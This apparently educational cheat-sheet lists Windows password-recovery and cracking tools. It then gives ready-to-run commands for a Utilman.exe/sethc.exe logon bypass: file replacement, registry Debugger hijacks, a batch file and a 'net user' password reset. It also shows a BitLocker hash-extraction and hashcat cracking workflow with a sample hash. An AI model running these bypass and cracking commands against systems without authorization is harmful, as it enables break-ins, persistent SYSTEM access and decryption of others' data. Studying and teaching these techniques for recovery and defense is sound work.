Several tools are widely used for password cracking and recovery on Windows systems, with each leveraging different techniques such as brute-force, dictionary, and rainbow table attacks. Below are detailed insights into the most prominent utilities:

## Hiren's BootCD PE x64

A comprehensive bootable rescue environment offering a wide array of tools, including password recovery utilities.

• Contains tools to access and reset Windows passwords without needing to boot into Windows.

• Official download: [hirensbootcd.org](https://www.hirensbootcd.org/)

• Includes tools like NT Password Edit, Lazesoft Password Recovery, and others to facilitate password reset or recovery.

## NT Password Edit v0.7

A specialized password editor for Windows NT-based systems (Windows 2000, XP, Vista, 7, 8, 10).

• Changes or removes local account passwords by directly modifying the SAM file.

• Cannot decrypt passwords or modify domain/Active Directory or Microsoft account passwords.

• Must be used on an offline copy of the Windows SAM file (can't be used on a running system due to file locking).

• Download and info: [ntpwedit.com](https://www.ntpwedit.com/) (includes source code and GPL license).

## Lazesoft Password Recovery v4.0.0.1

A powerful and user-friendly Windows password recovery and reset tool.

• Capable of resetting lost or forgotten Windows passwords and retrieving product keys.

• Often bundled within bootable environments like Hiren's BootCD for offline password reset.

• Official site: [lazesoft.com](https://www.lazesoft.com/).

## Kon-Boot

A tool that allows bypassing of Windows login password without altering the password itself.

• Supports Windows and Linux systems.

• Typically used for quickly gaining access to a locked system.

• Website: [kon-boot.com](https://kon-boot.com/).

## Passware Kit Forensic CD Boot Password Reset

A commercial forensic tool designed for Windows password recovery, including syskey-protected and full disk encrypted systems.

• Supports Windows 10 64-bit and provides advanced password reset and decryption features.

• Available at: [passware.com](https://www.passware.com/).

## Cain & Abel

This is a comprehensive password recovery tool for Windows that recovers passwords using network packet sniffing, dictionary, brute-force, and cryptanalysis attacks (using rainbow tables generated with winrtgen.exe).

• Suitable for professionals like network admins, forensic analysts, and security consultants.

• Can also reveal password boxes, dump protected storage passwords, and perform ARP spoofing.

## OphCrack

OphCrack is a free, cross-platform password cracker using rainbow tables to recover Windows passwords.

• Supports LM and NTLM hashes from Windows XP, Vista, 7, and works both via GUI and command-line.

• Quickly cracks most alphanumeric passwords and can run from a bootable live CD, making it useful for recovery when locked out of a system.

• Passwords longer than 14 characters, however, cannot be cracked by OphCrack.

## L0phtCrack

L0phtCrack is designed for password auditing and strength testing, using dictionary, brute-force, hybrid, and rainbow table attacks.

• Can retrieve hashes locally or remotely, schedule audits, and generate comprehensive reports on password security.

• Works with all current Windows versions and supports Unix hash types as well.

## RainbowCrack

RainbowCrack uses pre-computed rainbow tables for fast password hash cracking.

• Unlike dictionary or brute-force methods, its time-memory trade-off technique enables cracking of NTLM hashes.

• Hashes must be dumped from SAM or network traffic and formatted for RainbowCrack's input syntax.

# Windows Logon Bypass Using Utilman.exe

This technique outlines a method to bypass Windows logon by exploiting the Utilman.exe accessibility tool.

Utilman.exe is the Microsoft Windows utility manager that provides accessibility features on the login screen. This technique involves replacing Utilman.exe with the command prompt executable (cmd.exe), allowing an attacker to open a command prompt with SYSTEM privileges during login and execute commands to reset passwords or create new users.

## Method 1: Using Windows CMD

1. Rename the original Utilman.exe to keep a backup:
    
    ```
    move c:\\windows\\system32\\utilman.exe c:\\windows\\system32\\utilman.exe.bak
    
    ```
    
2. Replace Utilman.exe with cmd.exe:
    
    ```
    copy c:\\windows\\system32\\cmd.exe c:\\windows\\system32\\utilman.exe
    
    ```
    
3. At the login screen, click the Ease of Access button (usually at the bottom-left corner). This now launches the command prompt instead of the accessibility tools.
4. Use the command prompt to reset user passwords or create new users:
    
    ```
    net user username newpassword
    
    ```
    

## Method 2: Using Windows Registry

Add a Debugger to hijack execution of accessibility tools:

```
REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sethc.exe" /t REG_SZ /v Debugger /d "C:\\windows\\system32\\cmd.exe" /f

```

```
REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Utilman.exe" /t REG_SZ /v Debugger /d "%systemroot%\\system32\\cmd.exe" /f

```

Now, triggering Stick Keys (sethc.exe) or Ease of Access (Utilman.exe) will open the command prompt.

## Automating Registry Changes: update.bat

Create a batch file for automation:

```
@echo off
REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Utilman.exe" /t REG_SZ /v Debugger /d "%systemroot%\\system32\\cmd.exe" /f

```

## Resetting a User Password

Once command prompt is launched:

```
net user u2 123456789

```

This command resets the password of user "u2" to "123456789".

## Important Notes

- This method requires administrative or offline access to Windows system files or registry.

• It's often used for legitimate password recovery but can be exploited if physical access is available.

• Proper physical security and disk encryption can help defend against this bypass.

# BitLocker Password Recovery

## Overview

BitLocker Password Recovery Tools

• Specialized tools include BitLocker Password by Thegrideon Software, BLR BitLocker Data Recovery Software, etc.

• Support attacks like brute-force, dictionary, and mixed attacks.

• Scan encrypted drives or disk images to recover passwords.

## MEMORY.DMP Usage

MEMORY.DMP is a Windows kernel memory dump created during crashes or via tools like NotMyFault.

• Forensic tools like Elcomsoft can extract keys from MEMORY.DMP for BitLocker decryption.

## NotMyFault Tool

Sysinternals tool to induce system crashes or hangs intentionally.

• Used for testing, learning kernel debugging, and crash dump analysis.

• Can generate MEMORY.DMP files useful for forensic analysis.

## Elcomsoft Forensic Disk Decryptor

Forensic tool (v2.17+) extracts cryptographic keys from RAM, hibernation, page files.

• Instantly decrypts or mounts BitLocker volumes without brute-force.

• Uses kernel memory dumps like C:\Windows\MEMORY.DMP.

• Supports Windows 7 and above.

## bitlocker2john and hashcat Workflow

bitlocker2john extracts BitLocker password hash from volume images (vdi, img, etc.).

hashcat mode 22100 cracks BitLocker hashes using dictionary/brute-force attacks.

Typical steps:

1. Extract hash: `bitlocker2john <image file>`
2. Crack hash: `hashcat -m 22100 bitlocker-hash.txt /path/to/passwords.txt`

Success depends on password complexity and compute power.

## Useful Commands

### Extract BitLocker Hash from Disk Image

```
bitlocker2john escalate.vdi > bitlocker-hash.txt

```

```
john bitlocker-hash.txt --wordlist=/opt/password.txt

```

### Crack BitLocker Password Using hashcat (Dictionary Attack Example)

First, view the hash:

```
cat bitlocker-hash.txt
$bitlocker$0$1652dc2c5669566968ace2ad0e754385443518485765125f06a7273dc4fdc01038000@@$6859a262b133@@3636086ffc3243fcc546d369c30a525eb464cb3fd8b7d821ca932fa2980f18e7a8d7f80096876fdddc33775798c9c1e4aeae748e626f1

```

Then crack:

```
hashcat -m 22100 bitlocker-hash.txt /opt/password.txt

```

## Important Notes

- Requires legal authorization and appropriate forensic expertise.

• Success depends on password complexity and available resources.

• Physical access and memory analysis greatly improve chances of recovery.

## References

- NotMyFault - Sysinternals

• Elcomsoft Forensic Disk Decryptor

• Hashcat BitLocker mode

• Passware forensic file types
